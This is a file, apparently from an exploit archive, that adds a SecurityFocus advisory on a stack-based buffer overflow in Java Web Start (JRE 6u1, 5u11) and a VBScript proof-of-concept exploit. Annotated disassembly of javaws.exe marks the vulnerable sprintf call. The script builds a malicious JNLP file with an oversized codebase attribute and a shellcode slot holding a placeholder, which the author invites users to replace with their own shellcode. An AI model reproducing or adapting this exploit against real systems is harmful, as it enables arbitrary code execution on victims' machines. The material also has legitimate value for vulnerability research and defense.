@@ -1,0 +1,139 @@
+source: http://www.securityfocus.com/bid/24832/info
+
+Sun Java Runtime Environment is prone to a stack-based buffer-overflow vulnerability because it fails to adequately bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.
+
+An attacker can exploit this issue to execute arbitrary code with the privileges of the user running the affected application. Failed exploit attempts will likely result in a denial-of-service condition.
+
+This issue affects these versions:
+
+Java Runtime Environment 6 update 1
+Java Runtime Environment 5 update 11
+
+Prior versions are also affected. 
+
+'-----------------------------------------------------------------------------------------------
+' Java Web Start Buffer Overflow POC Exploit
+'
+' FileName: JavaWebStartPOC.VBS
+' Contact: ZhenHan.Liu#ph4nt0m.org
+' Date: 2007-07-10
+' Team: http://www.ph4nt0m.org
+' Enviroment: Tested on JRE 1.6, javaws.exe v6.0.10.6
+' Reference: http://seclists.org/fulldisclosure/2007/Jul/0155.html
+' Usage: I did not put a real alpha shellcode here, you'd replace it with your own.
+' 
+' Code(javaws.exe):
+' .text:00406208 ; *************** S U B R O U T I N E ***************************************
+' .text:00406208
+' .text:00406208 ; Attributes: bp-based frame
+' .text:00406208
+' .text:00406208 sub_406208      proc near               ; CODE XREF: sub_405468+4E p
+' .text:00406208
+' .text:00406208 FileName        = byte ptr -540h
+' .text:00406208 FindFileData    = _WIN32_FIND_DATAA ptr -140h
+' .text:00406208 arg_0           = dword ptr  8
+' .text:00406208 arg_4           = dword ptr  0Ch
+' .text:00406208
+' .text:00406208                 push    ebp             ; FileName 1k Buffer
+' .text:00406209                 mov     ebp, esp
+' .text:0040620B                 sub     esp, 540h
+' .text:00406211                 push    5Fh
+' .text:00406213                 push    2Fh
+' .text:00406215                 push    [ebp+arg_0]
+' .text:00406218                 call    sub_40544D
+' .text:00406218
+' .text:0040621D                 push    5Fh
+' .text:0040621F                 push    3Ah
+' .text:00406221                 push    [ebp+arg_0]
+' .text:00406224                 call    sub_40544D
+' .text:00406224
+' .text:00406229                 add     esp, 18h
+' .text:0040622C                 push    2Ah
+' .text:0040622E                 push    [ebp+arg_0]     ; codebase buffer
+' .text:00406231                 push    5Ch
+' .text:00406233                 push    offset s_Si     ; "si"
+' .text:00406238                 push    5Ch
+' .text:0040623A                 push    offset s_Tmp_0  ; "tmp"
+' .text:0040623F                 push    5Ch
+' .text:00406241                 call    sub_40615B
+' .text:00406241
+' .text:00406246                 push    eax
+' .text:00406247                 lea     eax, [ebp+FileName]
+' .text:0040624D                 push    offset s_SCSCSCSC ; "%s%c%s%c%s%c%s%c"
+' .text:00406252                 push    eax             ; char *
+' .text:00406253                 call    _sprintf        ; sprintf copy codebase to 1k stack buffer lead to buffer over flow
+' .text:00406253
+' .text:00406258                 add     esp, 28h
+' .text:0040625B                 lea     eax, [ebp+FindFileData]
+' .text:00406261                 push    eax             ; lpFindFileData
+' .text:00406262                 lea     eax, [ebp+FileName]
+' .text:00406268                 push    eax             ; lpFileName
+' .text:00406269                 call    ds:FindFirstFileA
+' .text:0040626F                 cmp     eax, 0FFFFFFFFh
+' .text:00406272                 jnz     short loc_406278
+' .text:00406272
+' .text:00406274                 xor     eax, eax
+' .text:00406276                 leave
+' .text:00406277                 retn
+' .text:00406277
+' .text:00406278 ; ---------------------------------------------------------------------------
+' .text:00406278
+' .text:00406278 loc_406278:                             ; CODE XREF: sub_406208+6A j
+' .text:00406278                 push    esi
+' .text:00406279                 mov     esi, [ebp+arg_4]
+' .text:0040627C                 lea     ecx, [ebp+FindFileData' .cFileName]
+' .text:00406282                 mov     edx, ecx
+' .text:00406284                 sub     esi, edx
+' .text:00406284
+' .text:00406286
+' .text:00406286 loc_406286:                             ; CODE XREF: sub_406208+86 j
+' .text:00406286                 mov     dl, [ecx]
+' .text:00406288                 mov     [esi+ecx], dl
+' .text:0040628B                 inc     ecx
+' .text:0040628C                 test    dl, dl
+' .text:0040628E                 jnz     short loc_406286
+' .text:0040628E
+' .text:00406290                 push    eax             ; hFindFile
+' .text:00406291                 call    ds:FindClose
+' .text:00406297                 xor     eax, eax
+' .text:00406299                 inc     eax
+' .text:0040629A                 pop     esi
+' .text:0040629B                 leave
+' .text:0040629C                 retn
+' .text:0040629C
+' .text:0040629C sub_406208      endp
+'-----------------------------------------------------------------------------------------------
+
+If WScript.Arguments.Count <> 1 Then
+	WScript.Echo WScript.ScriptName & " <FileName>"
+	WScript.Quit
+End If
+
+sFileName = WScript.Arguments(0)
+
+On Error Resume Next
+
+Set oFSO = WScript.CreateObject("Scripting.FileSystemObject")
+Set oFS = oFSO.CreateTextFile(sFileName)
+
+If Err.Number <> 0 Then
+	WScript.Echo "Error: Failed Create File."
+	WScript.Quit
+End If
+
+c = Chr(&H04)
+alphaShellcode = "IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII"
+
+oFS.WriteLine "<?xml version=""1.0"" encoding=""utf-8""?>"
+oFS.WriteLine "<jnlp spec=""1.0+"" codebase=""http://" & String(12000000, c) & alphaShellcode & String(24, c) & """ href=""test.jnlp"">"
+oFS.WriteLine "</jnlp>"
+
+If Err.Number <> 0 Then
+	WScript.Echo "Error: Failed Write File."
+	Err.Clear
+End If
+
+oFS.Close
+
+Set oFS = Nothing
+Set oFSO = Nothing
